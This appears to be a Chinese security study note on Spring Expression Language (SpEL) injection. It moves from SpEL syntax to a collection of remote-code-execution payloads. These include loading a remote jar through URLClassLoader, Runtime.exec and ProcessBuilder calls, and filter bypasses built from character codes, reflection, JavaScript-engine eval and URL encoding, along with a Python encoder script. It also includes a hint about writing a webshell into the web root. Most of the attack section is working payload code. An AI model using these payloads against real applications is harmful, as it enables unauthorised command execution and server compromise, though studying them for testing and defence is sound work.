## 基本语法
### 定界符
SpEL使用`#{}`作为定界符，所有在大括号中的字符都将被认为是SpEL表达式，在其中可以使用SpEL运算符、变量、引用bean及其属性和方法等
`#{}`和`${}`的区别：

- `#{}`就是SpEL的定界符，用于指明内容未SpEL表达式并执行；
- `${}`主要用于加载外部属性文件中的值；
- 两者可以混合使用，但是必须`#{}`在外面，`${}`在里面，如`#{'${}'}`，注意单引号是字符串类型才添加的；
### 类类型表达式
`T(Type)`运算符会调用类的作用域和方法。换句话说，就是可以通过该类类型表达式来操作类。
使用特殊的`T`运算符来指定`java.lang.Class`的实例(类型)。静态方法也是通过使用这个操作符来调用
`java.lang`中类型的`T()`引用不需要使用全限定名，但是其他包中的类，必须使用全限定名
### 变量
`#this`变量引用当前的评估对象(根据该评估对象解析非限定引用)。

`#root`变量总是被定义并引用根上下文对象。虽然#this可能会随着表达式的组成部分的计算而变化，但是`#root`总是指根

### Bean
要访问工厂bean本身，应该在bean名称前加上`&`符号

## 基本原理
![](attachments/Pasted%20image%2020240404113556.png)

### 条件
- 使用StandardEvaluationContext
- 未对输入的SpEL进行校验
- 对表达式调用了getValue()或setValue()方法
## RCE
### UrlClassLoader
>URLClassLoader 可以加载远程类库和本地路径的类库

```java
new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://127.0.0.1:8999/Exp.jar")}).loadClass("Exp").getConstructors()[0].newInstance("127.0.0.1:2333")
```


#### 内置对象加载UrlClassLoader

```JAVA
# POC_1
{request.getClass().getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"touch/tmp/foobar\")}
#POC_2
username[#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('xterm')")]=asdf
```

在POC_1使用了request对象。request、response对象，项目如果引入了spel的依赖，那么这两个对象会自动被注册进去，它调用的是UrlClassLoader

在POC_2中使用了this关键字，加载的也是UrlClassLoader
### AppClassLoader
>AppClassLoader 直接面向用户,它会加载 Classpath 环境变量里定义的路径中的 jar 包和目录
由于双亲委派的存在,它可以加载到我们想要的类


#### Runtime
```java
T(ClassLoader).getSystemClassLoader().loadClass("java.lang.Runtime").getRuntime().exec("open /System/Applications/Calculator.app")
```
#### ProcessBuilder
```java
T(ClassLoader).getSystemClassLoader().loadClass("java.lang.ProcessBuilder").getConstructors()[1].newInstance(new String[]{"open","/System/Applications/Calculator.app"}).start()
```

#### 其他类的AppClassLoader

```JAVA
T(org.springframework.expression.Expression).getClass().getClassLoader()
```

```JAVA
T(org.thymeleaf.context.AbstractEngineContext).getClass().getClassLoader()
```

```JAVA
T(com.ctf.controller.Demo).getClass().getClassLoader()
```


## Bypass
### 字符串Bypass
#### T(类名).getName()
`[[${T(String).getName()}]]`结果为java.lang.String，利用replace来完成替换

```JAVA
[[${T(String).getName()[0].replace(106,119)+T(String).getName()[0].replace(106,117)+T(String).getName()[0].replace(106,109)+T(String).getName()[0].replace(106,48)+T(String).getName()[0].replace(106,110)+T(String).getName()[0].replace(106,115)+T(String).getName()[0].replace(106,114)}]]
# 为wumnster
```

#### Character类构造字符串

```JAVA
[[${T(Character).toString(119)+T(Character).toString(117)+T(Character).toString(109)+T(Character).toString(48)+T(Character).toString(110)+T(Character).toString(115)+T(Character).toString(114)}]]
```

#### 外部可控字符绕过
##### GET、POST方法
```JAVA
# POST
#request.getMethod().substring(0,1).replace(80,119)%2b#request.getMethod().substring(0,1).replace(80,117)
# GET
#request.getMethod().substring(0,1).replace(71,119)%2b#request.getMethod().substring(0,1).replace(71,117)
```

##### cookie
```JAVA
[[${#request.getRequestedSessionId()}]]
```

#### 脚本
CreateAscii.py，用于String类动态生成字符的字符ASCII码转换生成：
```PYTHON
message = input('Enter message to encode:')  
   
print('Decoded string (in ASCII):\n')  
   
print('T(java.lang.Character).toString(%s)' % ord(message[0]), end="")  
for ch in message[1:]:  
   print('.concat(T(java.lang.Character).toString(%s))' % ord(ch), end=""),   
print('\n')  
   
print('new java.lang.String(new byte[]{', end=""),  
print(ord(message[0]), end="")  
for ch in message[1:]:  
   print(',%s' % ord(ch), end=""),   
print(')}')
```
#### 其他师傅的Bypass整理

```JAVA
// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1  
// byte数组内容的生成后面有脚本  
new java.lang.ProcessBuilder(new java.lang.String(new byte[]{99,97,108,99})).start()  
  
// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2  
// byte数组内容的生成后面有脚本  
T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(108)).concat(T(java.lang.Character).toString(99)))  
  
// JavaScript引擎通用PoC  
T(javax.script.ScriptEngineManager).newInstance().getEngineByName("nashorn").eval("s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"+"ng.Run"+"time.getRu"+"ntime().ex"+"ec(s);")  
  
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval("xxx"),)  
  
// JavaScript引擎+反射调用  
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",T(String[])).invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(T(String).getClass().forName("java.l"+"ang.Ru"+"ntime")),new String[]{"cmd","/C","calc"})),)  
  
// JavaScript引擎+URL编码  
// 其中URL编码内容为：  
// 不加最后的getInputStream()也行，因为弹计算器不需要回显  
T(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName("JavaScript").eval(T(java.net.URLDecoder).decode("%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29")),)  
  
// 黑名单过滤".getClass("，可利用数组的方式绕过，还未测试成功  
''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc')  
  
// JDK9新增的shell，还未测试  
T(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass("jdk.jshell.JShell",true).Methods[6].invoke(null,{}).eval('whatever java code in one statement').toString()
```


```JAVA
// 转自：https://www.jianshu.com/p/ce4ac733a4b9  
  
${pageContext} 对应于JSP页面中的pageContext对象（注意：取的是pageContext对象。）  
  
${pageContext.getSession().getServletContext().getClassLoader().getResource("")}   获取web路径  
  
${header}  文件头参数  
  
${applicationScope} 获取webRoot  
  
${pageContext.request.getSession().setAttribute("a",pageContext.request.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("命令").getInputStream())}  执行命令  
  
  
// 渗透思路：获取webroot路径，exec执行命令echo写入一句话。  
  
<p th:text="${#this.getClass().forName('java.lang.System').getProperty('user.dir')}"></p>   //获取web路径
```
## 参考资料
[Spring-SpEL表达式超级详细使用全解-CSDN博客](https://blog.csdn.net/A_art_xiang/article/details/134370029)

[SpEL注入RCE分析与绕过 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/9245?time__1311=n4%2BxuDgD9DyDRGCDCD0DBMb7e5xhDf2GxlrD&alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-2)

[一文详解SpEL表达式注入漏洞 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/608190489#:~:text=%E4%B8%80%E6%96%87%E8%AF%A6%E8%A7%A3SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%201%201%20SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E4%BB%8B%E7%BB%8D%20Spring%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AF%AD%E8%A8%80%EF%BC%88Spring%20Expression%20Language%EF%BC%8CSpEL%EF%BC%89%E6%98%AF%20Spring,Function%20SpEL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20...%204%204%20%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%89%8B%E6%AE%B5%20%EF%BC%881%EF%BC%89%E5%AF%B9%E4%BA%8ESpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%BC%8F%E6%B4%9E%EF%BC%8C%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E5%B7%A5%E5%85%B7%E8%BF%9B%E8%A1%8C%E4%BB%A3%E7%A0%81%E6%A3%80%E6%9F%A5%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%9C%89%E6%95%88%E8%A7%84%E9%81%BF%E9%83%A8%E5%88%86%E9%97%AE%E9%A2%98%E3%80%82%20)

[SpEL表达式注入漏洞总结 [ Mi1k7ea ]](https://www.mi1k7ea.com/2020/01/10/SpEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#PoC-amp-Bypass%E6%95%B4%E7%90%86)